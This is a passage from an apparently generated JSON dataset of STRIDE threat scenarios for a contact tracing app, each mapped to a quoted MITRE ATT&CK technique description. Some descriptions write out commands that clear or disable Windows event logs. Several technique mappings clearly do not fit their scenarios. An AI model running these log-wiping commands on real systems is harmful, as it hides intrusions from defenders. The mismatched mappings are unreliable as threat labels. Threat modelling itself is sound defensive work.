                    "Assumption": "Users do not have security measures like anti-malware software on their devices.",
                    "Role": "User",
                    "Condition": "Users do not utilize security software that could mitigate the exploitation attempts."
                }
            ],
            "Potential Impact": "Complete control of the user's device, allowing unauthorized actions and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "vulnerability exploitation",
                "device control",
                "mobile app"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider uses administrative access on the central server to elevate their privileges further by modifying access control configurations.",
            "Assumptions": [
                {
                    "Assumption": "Access control configurations can be modified by administrators.",
                    "Role": "System Administrator",
                    "Condition": "Administrative roles permit changes to access control settings."
                },
                {
                    "Assumption": "Monitoring and audit logging of configuration changes are insufficient or nonexistent.",
                    "Role": "Security Team",
                    "Condition": "The system lacks sufficient logging and monitoring for configuration changes."
                },
                {
                    "Assumption": "Role-based access control policies are inadequately defined or enforced.",
                    "Role": "System Architect",
                    "Condition": "The system does not have well-defined role-based access controls."
                }
            ],
            "Potential Impact": "Extended unauthorized privileges, leading to potential misuse of sensitive data and system functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "configuration manipulation",
                "insider threat",
                "server",
                "access control"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a security flaw in the service server to gain unauthorized root access, leading to total system compromise.",
            "Assumptions": [
                {
                    "Assumption": "The service server has security flaws.",
                    "Role": "Developer",
                    "Condition": "The server contains vulnerabilities that can be exploited for privilege escalation."
                },
                {
                    "Assumption": "Attackers know these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Attackers are aware of the vulnerabilities and have the technical expertise to exploit them."
                },
                {
                    "Assumption": "The server\u2019s defense mechanisms do not detect or prevent such exploitation.",
                    "Role": "System Administrator",
                    "Condition": "The server lacks adequate defense mechanisms against privilege escalation attacks."
                }
            ],
            "Potential Impact": "Complete system takeover, affecting sensitive data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "security flaw",
                "server",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Acquire Infrastructure",
                "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
                "id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
                "technique_id": "T1583"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers might spoof the central server to intercept data exchanges.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have the ability to spoof IP addresses.",
                    "Role": "Attacker",
                    "Condition": "The networking infrastructure allows IP spoofing."
                },
                {
                    "Assumption": "Users are unable to verify the authenticity of the central server.",
                    "Role": "User",
                    "Condition": "Users do not have a mechanism to verify server credentials."
                },
                {
                    "Assumption": "No HTTPS or other secure protocols are used.",
                    "Role": "Application",
                    "Condition": "Data exchanges are not encrypted."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and tampering of sensitive contact data.",
            "MITRE ATT&CK Keywords": [
                "network",
                "spoofing",
                "server",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious applications on the device masquerade as the official contact tracing app.",
            "Assumptions": [
                {
                    "Assumption": "The device's OS allows side loading of applications.",
                    "Role": "Device",
                    "Condition": "Users can install applications from unofficial sources."
                },
                {
                    "Assumption": "Users inadvertently grant permissions to the malicious app.",
                    "Role": "User",
                    "Condition": "Users are not educated about safe installation practices."
                },
                {
                    "Assumption": "Application signatures are not verified.",
                    "Role": "Device",
                    "Condition": "Devices do not verify app signatures before installation."
                }
            ],
            "Potential Impact": "Unauthorized access and collection of personal data.",
            "MITRE ATT&CK Keywords": [
                "device",
                "spoofing",
                "application",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Fake Bluetooth IDs are broadcasted to trick other devices into recording false contacts.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications can be altered by attackers.",
                    "Role": "Attacker",
                    "Condition": "Attackers possess the technical means to interfere with Bluetooth signals."
                },
                {
                    "Assumption": "No validation mechanism for Bluetooth ID authenticity.",
                    "Role": "Application",
                    "Condition": "Bluetooth IDs are taken at face value without verification."
                },
                {
                    "Assumption": "Users' devices are left with Bluetooth enabled by default.",
                    "Role": "User",
                    "Condition": "Users keep Bluetooth on continuously."
                }
            ],
            "Potential Impact": "Inaccurate contact tracing leading to unnecessary quarantines.",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "spoofing",
                "device",
                "proximity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers modify the log files to hide their presence or alter data.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored in an unprotected format.",
                    "Role": "Application",
                    "Condition": "Log files do not have adequate access controls."
                },
                {
                    "Assumption": "Attackers have write access to log storage.",
                    "Role": "Attacker",
                    "Condition": "There is a security breach allowing access to log storages."
                },
                {
                    "Assumption": "Log integrity checks are not performed.",
                    "Role": "Application",
                    "Condition": "Application does not verify the integrity of logs."
                }
            ],
            "Potential Impact": "Degraded data integrity and potentially misleading data analysis.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log files",
                "data integrity",
                "writing"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers modify application code on mobile devices.",
            "Assumptions": [
                {
                    "Assumption": "Users install from unofficial sources.",
                    "Role": "User",
                    "Condition": "Application is installed from untrusted sources."
                },
                {
                    "Assumption": "Applications are not signed and verified.",
                    "Role": "Device",
                    "Condition": "Device does not verify app signatures."
                },
                {
                    "Assumption": "No code integrity checks are performed after installation.",
                    "Role": "Application",
                    "Condition": "The application does not validate its own integrity regularly."
                }
            ],
            "Potential Impact": "Compromised application behavior leading to unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "application",
                "code modification",
                "device"
            ],
            "mitre_technique": {
                "name": "Plist Modification",
                "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
                "id": "attack-pattern--06780952-177c-4247-b978-79c357fb311f",
                "technique_id": "T1150"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Data packets are intercepted and altered during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "Application",
                    "Condition": "Data exchanges use unsecured protocols."
                },
                {
                    "Assumption": "Network traffic is not monitored for tampering.",
                    "Role": "System",
                    "Condition": "No mechanisms to detect altered packets."
                },
                {
                    "Assumption": "Attackers have control over network segments.",
                    "Role": "Attacker",
                    "Condition": "Attackers can intercept and alter data in transit."
                }
            ],
            "Potential Impact": "Confidentiality and integrity of contact data are compromised.",
            "MITRE ATT&CK Keywords": [
                "network",
                "tampering",
                "data packets",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny actions and transactions related to contact data uploads.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanism in place.",
                    "Role": "Application",
                    "Condition": "System lacks mechanisms like digital signatures."
                },
                {
                    "Assumption": "Logs do not capture detailed user actions.",
                    "Role": "System",
                    "Condition": "Logging is insufficient to prove actions."
                },
                {
                    "Assumption": "Users can access and modify logs.",
                    "Role": "User",
                    "Condition": "No restrictions on log modifications."
                }
            ],
            "Potential Impact": "Inability to trace actions back to the authentic user.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user actions",
                "digital signatures",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Central server denies alerts sent to users about possible exposure.",
            "Assumptions": [
                {
                    "Assumption": "No audit trail of alert notifications.",
                    "Role": "System",
                    "Condition": "Alert notifications are not logged."
                },
                {
                    "Assumption": "Users cannot verify if notifications were sent or not.",
                    "Role": "User",
                    "Condition": "There is no feedback mechanism for users."
                },
                {
                    "Assumption": "No secure method for users to challenge the system.",
                    "Role": "User",
                    "Condition": "Users lack a secure channel to question or verify alerts."
                }
            ],
            "Potential Impact": "Users may not trust the alerts, reducing system effectiveness.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "server",
                "alert notifications",
                "logging"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare authorities deny receipt of uploaded positive cases.",
            "Assumptions": [
                {
                    "Assumption": "No system for upload receipts or acknowledgments.",
                    "Role": "System",
                    "Condition": "Uploads are not acknowledged."
                },
                {
                    "Assumption": "Users cannot verify that their data was processed.",
                    "Role": "User",
                    "Condition": "No mechanism to verify data processing."
                },
                {
                    "Assumption": "No logging of uploaded data.",
                    "Role": "System",
                    "Condition": "Uploded data is not tracked in logs."
                }
            ],
            "Potential Impact": "Healthcare authorities might mishandle contact tracing data causing misinformation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data uploads",
                "acknowledgments",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attackers gain access to sensitive user data from the centralized server.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks strong access controls.",
                    "Role": "System",
                    "Condition": "Access controls on the server are insufficient."
                },
                {
                    "Assumption": "Data is stored in an unencrypted format.",
                    "Role": "System",
                    "Condition": "Sensitive data is not encrypted at rest."
                },
                {
                    "Assumption": "No monitoring for unauthorized access.",
                    "Role": "System",
                    "Condition": "System lacks intrusion detection."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive health data.",
            "MITRE ATT&CK Keywords": [
                "server",
                "information disclosure",
                "sensitive data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Service Stop",
                "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",
                "id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b",
                "technique_id": "T1489"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Bluetooth data containing user identifiers is intercepted.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications are in plain text.",
                    "Role": "Application",
                    "Condition": "Bluetooth interactions are not secured."
                },
                {
                    "Assumption": "No method to verify legitimate Bluetooth devices.",
                    "Role": "Application",
                    "Condition": "Devices do not authenticate each other."
                },
                {
                    "Assumption": "Attackers are within Bluetooth range.",
                    "Role": "Attacker",
                    "Condition": "Attackers can physically be near target devices."
                }
            ],
            "Potential Impact": "Leakage of user identifiers and potential tracking.",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "information disclosure",
                "user identifiers",
                "interception"
            ],
            "mitre_technique": {
                "name": "Path Interception by Unquoted Path",
